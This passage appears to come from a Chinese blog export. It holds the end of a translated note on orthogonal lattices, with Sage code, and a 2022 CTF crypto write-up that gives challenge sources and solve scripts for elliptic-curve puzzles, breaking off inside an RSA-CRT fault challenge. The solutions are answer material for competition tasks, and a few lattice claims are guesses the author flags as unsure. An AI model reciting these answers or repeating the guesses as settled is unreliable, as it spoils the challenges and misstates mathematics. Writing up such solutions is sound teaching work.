=\n\\begin{pmatrix}\n\\langle\\mathbf{v}_1,\\mathbf{v}_1\\rangle & \\cdots & \\langle\\mathbf{v}_1,\\mathbf{v}_k\\rangle \\\\\\\\\n\\vdots & \\ddots & \\vdots \\\\\\\\\n\\langle\\mathbf{v}_k,\\mathbf{v}_1\\rangle & \\cdots & \\langle\\mathbf{v}_k,\\mathbf{v}_k\\rangle\n\\end{pmatrix}\n$$\n不难看出这个可以等价表示为 $V^T\\times V$ ，得出的矩阵也显然是对称的。\n这里 $\\mathit{\\Lambda}$ 不是一个方阵，故不能直接求出其行列式，那么就应该通过其 Gram 矩阵来求行列式，这里我觉得应该是 $\\det(\\mathit{\\Lambda})=\\sqrt{\\det(Q)}$ ，但我不确定。\n\n**定理1** 令 $\\mathit{\\Lambda}$ 为 $\\mathbf{Z}^n$ 上的完备格，那么 $\\det(\\mathit{\\Lambda}^-)=\\det(\\mathit{\\Lambda})$ 。\n证明：我们有 $\\mathit{\\Lambda}=E_{\\mathit{\\Lambda}}\\cap\\mathbf{Z}^n$ 和 $\\mathit{\\Lambda}^-=E_{\\mathit{\\Lambda}}^-\\cap\\mathbf{Z}^n$ 。从另一篇论文（我也没读过）我们知道：\n$$\n\\det(\\mathbf{Z}^n)=\\frac{\\det(E_{\\mathit{\\Lambda}}\\cap\\mathbf{Z}^n)}{\\det((E_{\\mathit{\\Lambda}}^-)\\cap(\\mathbf{Z}^n)^*)}\n$$\n其中 $(\\mathbf{Z}^n)^*$ 表示 $\\mathbf{Z}^n$ 上的极格。但 $\\det(\\mathbf{Z}^n)=1$ （？为什么要说但呢？）且 $(\\mathbf{Z}^n)^*=\\mathbf{Z}^n$ ，故 $\\det(\\mathit{\\Lambda}^-)=\\det(\\mathit{\\Lambda})$ 。\n\n**推论2** 令 $\\mathit{\\Lambda}$ 为 $\\mathbf{Z}^n$ 上的格，那么 $\\det((\\mathit{\\Lambda}^-)^-)=\\det(\\mathit{\\Lambda}^-)=\\det(\\overline{\\mathit{\\Lambda}})$ 。\n\n**定理3** 令 $(\\mathbf{b}_1,...,\\mathbf{b}_d)$为格$\\mathit{\\Lambda}$ 在 $\\mathbf{Z}^n$ 上的一组 LLL 约化基，那么：\n\n1. $\\det(\\mathit{\\Lambda})\\leq \\prod^d_{i=1}||\\mathbf{b}_i||\\leq 2^{d(d-1)/4}\\det(\\mathit{\\Lambda})$\n2. 对任意线性无关的向量 $\\mathbf{x}_1,...,\\mathbf{x}_t\\in\\mathit{\\Lambda}$ ，当 $1\\leq j \\leq t$ 时，有：\n\n$$\n||\\mathbf{b}_j||\\leq 2^{(d-1)/2}\\max(||\\mathbf{x}_1||,...,||\\mathbf{x}_t||)\n$$\n\n我们现在描述计算正交格的一组 LLL 约化基的基本方法。令 $\\mathcal{B}=(\\mathbf{b}_1,...,\\mathbf{b}\\_d)$ 为 $\\mathit{\\Lambda}$ 的一组基， $B=(b\\_{i,j})$ 为其对应的 $n\\times d$ 的矩阵。令 $c$ 为一个正整数常量。定义 $\\mathit{\\Omega}$为$\\mathbf{Z}^{n+d}$ 上由以下 $(n+d)\\times n$ 矩阵张成的格。\n\n$$\nB^-=\n\\begin{pmatrix}\nc\\times b_{1,1} & c\\times b_{2,1} & \\cdots & c\\times b_{n,1} \\\\\\\\\nc\\times b_{1,2} & c\\times b_{2,2} & \\cdots & c\\times b_{n,2} \\\\\\\\\n\\vdots & \\vdots & \\ddots & \\vdots \\\\\\\\\nc\\times b_{1,d} & c\\times b_{2,d} & \\cdots & c\\times b_{n,d} \\\\\\\\\n1 & 0 & \\cdots & 0 \\\\\\\\\n0 & 1 & \\cdots & 0 \\\\\\\\\n\\vdots & \\vdots & \\ddots & \\vdots \\\\\\\\\n0 & 0 & \\cdots & 1\n\\end{pmatrix}\n$$\n矩阵 $B^-$ 被分成两块：上面 $d\\times n$ 部分是 $c\\ {^tB}$ ，下面 $n\\times n$ 部分是单位阵。\n设 $p_{\\uparrow}$ 和 $p_{\\downarrow}$ 是两个投影，将 $\\mathbf{Z}^{n+d}$ 的任何向量分别映射到由其前 $d$ 个坐标构成的 $\\mathbf{Z}^d$ 向量和由其最后 $n$ 个坐标构成的 $\\mathbf{Z}^n$ 向量，所有投影都与正则基有关。~~（这段翻译累死我了）~~\n令 $\\mathbf{x}$ 为 $\\mathit{\\Omega}$ 的一个向量并记 $\\mathbf{y}=p_{\\downarrow}(\\mathbf{x})$ ，那么\n\n$$\np_{\\uparrow}(\\mathbf{y})=\n\\begin{pmatrix}\n\\mathbf{y}.\\mathbf{b}\\_1 \\\\\\\\\n\\vdots \\\\\\\\\n\\mathbf{y}.\\mathbf{b}\\_d\n\\end{pmatrix}\n$$\n因此，当且仅当 $p\\_{\\uparrow}(\\mathbf{x})=0$ 时有 $\\mathbf{y}\\in \\mathit{\\Lambda}^-$ 。此外，如果 $||\\mathbf{x}||\\leq c$ ，那么 $p_{\\uparrow}(\\mathbf{x})=0$ 。\n\n**定理4** 令 $(\\mathbf{x}_1,\\mathbf{x}_2,...,\\mathbf{x}_n)$ 为格 $\\mathit{\\Omega}$ 的一组 LLL 约化基。若\n\n$$\nc>2^{(n-1)/2+(n-d)(n-d-1)/4}\\det(\\overline{\\mathit{\\Lambda}})\n$$\n则 $(p_{\\downarrow}(\\mathbf{x}\\_1),p_{\\downarrow}(\\mathbf{x}\\_2),...,p_{\\downarrow}(\\mathbf{x}_{n-d}))$ 为 $\\overline{\\mathit{\\Lambda}}$ 的一组 LLL 约化基。\n\n使用阿达马不等式，我们得到以下算法：\n\n**算法5** 给定一组 $\\mathbf{Z}^n$ 上格 $\\mathit{\\Lambda}$ 的基 $(\\mathbf{b}_1,\\mathbf{b}_2,...,\\mathbf{b}_d)$ ，该算法计算一组 $\\overline{\\mathit{\\Lambda}}$ 的LLL约化基。\n\n1. 选取 $c=\\lceil2^{(n-1)/2+(n-d)(n-d-1)/4}\\prod^d_{j=1}||\\mathbf{b}_j||\\rceil$\n\n2. 计算 $(n+d)\\times n$ 的整数矩阵 $B^-$ 和 $\\mathbf{b}_1,...,\\mathbf{b}\\_d$ 对应的 $n\\times d$ 矩阵 $B=(b\\_{i,j})$\n\n3. 计算由 $B^-$ 张成的格的一组 LLL 约化基 $(\\mathbf{x}_1,\\mathbf{x}_2,...,\\mathbf{x}_n)$\n\n4. 输出 $(p_{\\downarrow}(\\mathbf{x}\\_1),p_{\\downarrow}(\\mathbf{x}\\_2),...,p_{\\downarrow}(\\mathbf{x}_{n-d}))$\n\n可以证明，这是一个关于空间维数 $n$ 、格维数 $d$ 和 $||\\mathbf{b}_j||$ 比特长度的任何上界的确定性多项式时间算法。在实践中，不需要选择这样大的常数 $c$ ，因为 LLL 算法的理论界非常悲观。（翻译了这么久都看不懂，我也很悲观.jpg）\n\n> 笔者注记：\n$\\lceil$和$\\rceil$表示向上取整，例如$\\lceil 1.2 \\rceil = 2$。\n\n#### 实现\n\n之前看过 Herry 师傅从 dbt 那抄的一个求法是用左零空间求解，代码如下\n\n```python\ndef orthogonal_lattice(B):\n    LB = B.transpose().left_kernel(basis=\"LLL\").basis_matrix()\n    return LB\n```\n\n但笔者发现这样似乎只能在低维下求解，高维情况下时间会爆炸（至少试过一夜都没跑出来）\n于是照着 paper 搓了一个 implemention ，快了很多，三分钟左右就能求解 $255\\times512$ 矩阵的正交格，代码如下\n\n```python\ndef orthogonal_lattice(B):\n    _d, _n = B.nrows(), B.ncols()\n    _c = 2 ** min(((_n-1)/2+(_n-_d)*(_n-_d-1)/4),20)    # this bound can be adjusted as needed\n    for b in B:\n        _c *= b.norm()\n    B_bot = (ceil(_c)*B).stack(identity_matrix(ZZ, _n))\n    B_r = B_bot.transpose().LLL()\n    LB = B_r.matrix_from_rows_and_columns(range(_n-_d), range(_d,_n+_d))\n    assert (B*LB.transpose()).is_zero()\n    return LB\n```\n\n## 参考\n\n* [P. Q. Nguyen and J. Stern. Merkle-Hellman revisited: A cryptoanalysis of the Qu-Vanstone cryptosystem based on group factorizations. In B. S. Kaliski Jr., editor, CRYPTO, volume 1294 of Lecture Notes in Computer Science, pages 198–212. Springer, 1997.](https://link.springer.com/chapter/10.1007/BFb0052236)\n\n* [Modulus Fault Attacks Against RSA-CRT Signatures](https://link.springer.com/article/10.1007/s13389-011-0015-x)\n\n* [知乎 线性代数之——正交向量与子空间](https://zhuanlan.zhihu.com/p/50483906)\n\n* [知乎 格拉姆矩阵（Gram matrix）详细解读](https://zhuanlan.zhihu.com/p/187345192)\n","slug":"2022 巅峰极客 Crypto","published":1,"updated":"2024-06-05T07:52:28.105Z","comments":1,"layout":"post","photos":[],"_id":"clxa5zocr00037slzdw5h6ydn","content":"<p>有瓜吃，美滋滋。</p>\n<span id=\"more\"></span>\n\n<p>题目质量一般，知识问答还全是搬运今年 ciscn 的。<br>然后三个队友都没啥空，就我一个做了两道密码，排 88 名，对我这个菜鸡来说也还行吧。</p>\n<h2 id=\"point-power\"><a href=\"#point-power\" class=\"headerlink\" title=\"point-power\"></a>point-power</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> gmpy2 <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> random <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> secrets <span class=\"keyword\">import</span> flag</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">assert</span> <span class=\"built_in\">len</span>(flag)==<span class=\"number\">42</span></span><br><span class=\"line\">p=getPrime(<span class=\"number\">600</span>)</span><br><span class=\"line\">a=bytes_to_long(flag)</span><br><span class=\"line\">b=randrange(<span class=\"number\">2</span>,p-<span class=\"number\">1</span>)</span><br><span class=\"line\">E=EllipticCurve(GF(p),[a,b])</span><br><span class=\"line\">G=E.random_element()</span><br><span class=\"line\"></span><br><span class=\"line\">x1,y1,_=G</span><br><span class=\"line\">G=<span class=\"number\">2</span>*G</span><br><span class=\"line\">x2,y2,_=G</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;p = <span class=\"subst\">&#123;p&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;b = <span class=\"subst\">&#123;b&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;x1 = <span class=\"subst\">&#123;x1&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;x2 = <span class=\"subst\">&#123;x2&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">p = 3660057339895840489386133099442699911046732928957592389841707990239494988668972633881890332850396642253648817739844121432749159024098337289268574006090698602263783482687565322890623</span></span><br><span class=\"line\"><span class=\"string\">b = 1515231655397326550194746635613443276271228200149130229724363232017068662367771757907474495021697632810542820366098372870766155947779533427141016826904160784021630942035315049381147</span></span><br><span class=\"line\"><span class=\"string\">x1 = 2157670468952062330453195482606118809236127827872293893648601570707609637499023981195730090033076249237356704253400517059411180554022652893726903447990650895219926989469443306189740</span></span><br><span class=\"line\"><span class=\"string\">x2 = 1991876990606943816638852425122739062927245775025232944491452039354255349384430261036766896859410449488871048192397922549895939187691682643754284061389348874990018070631239671589727</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>这题完全是现学现卖，之前只听说过椭圆曲线，然后就跑去学抽代忘记回来了。。。<br>首先查到椭圆曲线的加法（两点相同的情形）：<br>$$<br>x_2=m^2-2x_1\\pmod p \\ with \\ m=\\frac{3x_1^2+a}{2y_1}<br>$$<br>又在 Sagemath 文档查到曲线定义 $y_1^2=x_1^3+ax_1+b$ ，就能联立出一个一元二次方程，exp 如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p = <span class=\"number\">3660057339895840489386133099442699911046732928957592389841707990239494988668972633881890332850396642253648817739844121432749159024098337289268574006090698602263783482687565322890623</span></span><br><span class=\"line\">b = <span class=\"number\">1515231655397326550194746635613443276271228200149130229724363232017068662367771757907474495021697632810542820366098372870766155947779533427141016826904160784021630942035315049381147</span></span><br><span class=\"line\">x1 = <span class=\"number\">2157670468952062330453195482606118809236127827872293893648601570707609637499023981195730090033076249237356704253400517059411180554022652893726903447990650895219926989469443306189740</span></span><br><span class=\"line\">x2 = <span class=\"number\">1991876990606943816638852425122739062927245775025232944491452039354255349384430261036766896859410449488871048192397922549895939187691682643754284061389348874990018070631239671589727</span></span><br><span class=\"line\"></span><br><span class=\"line\">K = GF(p)</span><br><span class=\"line\">n=(K(x2+<span class=\"number\">2</span>*x1)).sqrt()</span><br><span class=\"line\">P.&lt;x&gt;= PolynomialRing(K)</span><br><span class=\"line\">A=<span class=\"number\">1</span></span><br><span class=\"line\">B=<span class=\"number\">6</span>*x1**<span class=\"number\">2</span>-<span class=\"number\">4</span>*n**<span class=\"number\">2</span>*x1</span><br><span class=\"line\">C=-(<span class=\"number\">4</span>*n**<span class=\"number\">2</span>*x1**<span class=\"number\">3</span>+<span class=\"number\">4</span>*n**<span class=\"number\">2</span>*b-<span class=\"number\">9</span>*x1**<span class=\"number\">4</span>)</span><br><span class=\"line\">f=A*x**<span class=\"number\">2</span>+B*x+C</span><br><span class=\"line\">roots=f.roots()</span><br><span class=\"line\"><span class=\"built_in\">print</span>(roots)</span><br><span class=\"line\">flag=roots[<span class=\"number\">1</span>][<span class=\"number\">0</span>]</span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"built_in\">print</span>(long_to_bytes(<span class=\"built_in\">int</span>(flag)))</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"strange-curve\"><a href=\"#strange-curve\" class=\"headerlink\" title=\"strange curve\"></a>strange curve</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> gmpy2 <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> secrets <span class=\"keyword\">import</span> flag</span><br><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">P,Q</span>):</span><br><span class=\"line\">    (x1,y1)=P</span><br><span class=\"line\">    (x2,y2)=Q</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    x3=(x1+x2)*(<span class=\"number\">1</span>+y1*y2)*invert((<span class=\"number\">1</span>+x1*x2)*(<span class=\"number\">1</span>-y1*y2),p)%p</span><br><span class=\"line\">    y3=(y1+y2)*(<span class=\"number\">1</span>+x1*x2)*invert((<span class=\"number\">1</span>-x1*x2)*(<span class=\"number\">1</span>+y1*y2),p)%p</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> (x3,y3)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">mul</span>(<span class=\"params\">e,P</span>):</span><br><span class=\"line\">    Q=(<span class=\"number\">0</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">    e=e%p</span><br><span class=\"line\">    <span class=\"keyword\">while</span> e:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> e&amp;<span class=\"number\">1</span>:</span><br><span class=\"line\">            Q=add(Q,P)</span><br><span class=\"line\">        P=add(P,P)</span><br><span class=\"line\">        e&gt;&gt;=<span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> Q</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">Legendre</span>(<span class=\"params\">a,p</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (<span class=\"built_in\">pow</span>((a%p+p)%p,(p-<span class=\"number\">1</span>)//<span class=\"number\">2</span>,p))%p</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_ts</span>(<span class=\"params\">p</span>):</span><br><span class=\"line\">    p=p-<span class=\"number\">1</span></span><br><span class=\"line\">    count=<span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> p%<span class=\"number\">2</span>==<span class=\"number\">0</span>:</span><br><span class=\"line\">        count+=<span class=\"number\">1</span></span><br><span class=\"line\">        p=p//<span class=\"number\">2</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> count,p</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_nonre</span>(<span class=\"params\">p</span>):</span><br><span class=\"line\">    a=random.randint(<span class=\"number\">1</span>,p)</span><br><span class=\"line\">    <span class=\"keyword\">while</span> Legendre(a,p)==<span class=\"number\">1</span>:</span><br><span class=\"line\">        a=random.randint(<span class=\"number\">1</span>,p)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> a</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">amm2</span>(<span class=\"params\">a,p</span>):</span><br><span class=\"line\">    t,s=get_ts(p)</span><br><span class=\"line\">    ta=<span class=\"built_in\">pow</span>(get_nonre(p),s,p)</span><br><span class=\"line\">    tb=<span class=\"built_in\">pow</span>(a,s,p)</span><br><span class=\"line\">    h=<span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,t):</span><br><span class=\"line\">        d=<span class=\"built_in\">pow</span>(tb,<span class=\"number\">2</span>**t-<span class=\"number\">1</span>-i,p)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> d==<span class=\"number\">1</span>:</span><br><span class=\"line\">            k=<span class=\"number\">0</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            k=<span class=\"number\">1</span></span><br><span class=\"line\">        tb=(tb*<span class=\"built_in\">pow</span>(ta,<span class=\"number\">2</span>*k,p))%p</span><br><span class=\"line\">        h=(h*<span class=\"built_in\">pow</span>(ta,k,p))%p</span><br><span class=\"line\">        ta=<span class=\"built_in\">pow</span>(ta,<span class=\"number\">2</span>,p)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> h*<span class=\"built_in\">pow</span>(a,(s+<span class=\"number\">1</span>)//<span class=\"number\">2</span>,p)%p  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">solve</span>(<span class=\"params\">a,b,c,p</span>):</span><br><span class=\"line\">    tmpa=<span class=\"number\">1</span></span><br><span class=\"line\">    tmpb=b*inverse(a,p)%p</span><br><span class=\"line\">    tmpc=c*inverse(a,p)%p</span><br><span class=\"line\">    <span class=\"keyword\">assert</span> Legendre(tmpb**<span class=\"number\">2</span>*inverse(<span class=\"number\">4</span>,p)-tmpc,p)==<span class=\"number\">1</span></span><br><span class=\"line\">    res1=(amm2(tmpb**<span class=\"number\">2</span>*inverse(<span class=\"number\">4</span>,p)-tmpc,p)-tmpb*inverse(<span class=\"number\">2</span>,p))%p</span><br><span class=\"line\">    res2=(-amm2(tmpb**<span class=\"number\">2</span>*inverse(<span class=\"number\">4</span>,p)-tmpc,p)-tmpb*inverse(<span class=\"number\">2</span>,p))%p</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (res1,res2)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">lift</span>(<span class=\"params\">x,a,b,p</span>):</span><br><span class=\"line\">    tmp=b*(x**<span class=\"number\">2</span>-<span class=\"number\">1</span>)*inverse(a*x,p)%p</span><br><span class=\"line\">    <span class=\"keyword\">return</span> solve(<span class=\"number\">1</span>,-tmp,-<span class=\"number\">1</span>,p)[<span class=\"number\">0</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">p=<span class=\"number\">9410547699903726871336507117271550134683191140146415131394654141737636910570480327296351841515571767317596027931492843621727002889086193529096531342265353</span></span><br><span class=\"line\">a=<span class=\"number\">54733430689690725746438325219044741824500093621550218736194675295708808435509</span></span><br><span class=\"line\">b=<span class=\"number\">75237024593957256761258687646797952793573177095902495908321724558796076392871</span></span><br><span class=\"line\">x=bytes_to_long(flag)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        y=lift(x,a,b,p)</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        x+=<span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">assert</span> a*x*(y**<span class=\"number\">2</span>-<span class=\"number\">1</span>)%p==b*y*(x**<span class=\"number\">2</span>-<span class=\"number\">1</span>)%p</span><br><span class=\"line\"></span><br><span class=\"line\">P=(x,y)</span><br><span class=\"line\">e=<span class=\"number\">65537</span></span><br><span class=\"line\"></span><br><span class=\"line\">eP=mul(e,P)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;P = <span class=\"subst\">&#123;P&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;eP = <span class=\"subst\">&#123;eP&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">P = (56006392793427940134514899557008545913996191831278248640996846111183757392968770895731003245209281149, 5533217632352976155681815016236825302418119286774481415122941272968513081846849158651480192550482691343283818244963282636939305751909505213138032238524899)</span></span><br><span class=\"line\"><span class=\"string\">eP = (mpz(8694229840573103722999959579565187489450818138005222030156495740841851804943200684116883831426548909867463656993852596745698999492932194245562062558787005), mpz(9279986963919197374405152604360936066932975197577643570458423456304679111057526702737279809805694360981565554506626018364382736924914907001214909905449002))</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>这题真的是蚌不住，刚放出来解出数就蹭蹭往上涨，还有点怀疑人生，然后仔细观察题目，一看上面，什么玩意，再看下面，什么玩意。。。<br>直接拿第一个数 <code>long_to_bytes</code> ，得到 flag。</p>\n<h2 id=\"Learning-with-fault\"><a href=\"#Learning-with-fault\" class=\"headerlink\" title=\"Learning with fault\"></a>Learning with fault</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> gmpy2 <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> secrets <span class=\"keyword\">import</span> flag</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">RSA</span>():</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self,p,q,e</span>):</span><br><span class=\"line\">        self.p=p</span><br><span class=\"line\">        self.q=q</span><br><span class=\"line\">        self.e=e</span><br><span class=\"line\">        self.phi=(p-<span class=\"number\">1</span>)*(q-<span class=\"number\">1</span>)</span><br><span class=\"line\">        self.d=invert(self.e,self.phi)</span><br><span class=\"line\">        self.dp=self.d%(p-<span class=\"number\">1</span>)</span><br><span class=\"line\">        self.dq=self.d%(q-<span class=\"number\">1</span>)</span><br><span 